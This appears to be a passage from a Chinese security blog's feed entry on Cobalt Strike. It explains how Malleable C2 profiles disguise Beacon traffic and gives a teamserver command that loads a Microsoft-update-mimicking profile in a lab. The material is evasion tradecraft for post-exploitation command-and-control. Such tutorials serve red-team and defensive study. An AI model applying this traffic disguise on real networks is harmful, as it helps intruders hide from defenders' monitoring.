src="/2020/07/03/Cobaltstrike/image-20200628225146945.png" alt="image-20200628225146945"></p><p> 这样就把msf代理到内网中去了，接下来就可以使用msf对内网中的机器进行渗透。</p><h4 id="MallelableC2配置与使用"><a href="#MallelableC2配置与使用" class="headerlink" title="MallelableC2配置与使用"></a>MallelableC2配置与使用</h4><p>Malleable C2就是Malleable Command and Control，Beacon中的http通讯由Malleable-C2配置文件控制，在启动teamserver时来指定我们的配置文件，每个CS实例只能载入一个配置文件。用CobaltStrike的 Malleable-C2-Profiles伪装流量，让我们的通讯更加隐蔽。</p><p>前提已拿到靶机beacon</p><p><img src="/2020/07/03/Cobaltstrike/image-20200628225757408.png" alt="image-20200628225757408"></p><p>使用科来专家增强版对虚拟机网络进行抓包</p><p><img src="/2020/07/03/Cobaltstrike/image-20200628225923211.png" alt="image-20200628225923211"></p><p><img src="/2020/07/03/Cobaltstrike/image-20200628231335956.png" alt="image-20200628231335956"></p><p>使用CobaltStrike的 Malleable-C2-Profiles伪装流量， Beacon中的http通讯由Malleable-C2配置文件控制，在启动teamserver时来指定我们的配置文件,每个CS只能载入一个配置文件。其中目录下的 c2lint 文件可以检测配置文件的语法问题和测试。</p><p>github上的Malleable-C2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;rsmudge&#x2F;Malleable-C2-Profiles</span><br></pre></td></tr></table></figure><p>使用时的语法如下所示，即在启动teamserver时在最后指定profile的位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;teamserver  172.16.12.137  password  &#x2F;root&#x2F;cs&#x2F;Malleable-C2-Profiles-master&#x2F;normalicrosoftupdate_getonly.profile</span><br></pre></td></tr></table></figure><p>再次抓包发现，已伪装成功</p><p><img src="/2020/07/03/Cobaltstrike/image-20200628232750307.png" alt="image-20200628232750307"></p><hr><p>根据中华人民共和国《网络安全法》相关政策规定，本文章只做安全预警，不被允许通过本文章技术手段进行非法行为，使用技术的风险由您自行承担。</p><hr>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="安全工具" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="Cobaltstrike" scheme="http://yoursite.com/tags/Cobaltstrike/"/>
    
  </entry>
  
</feed>
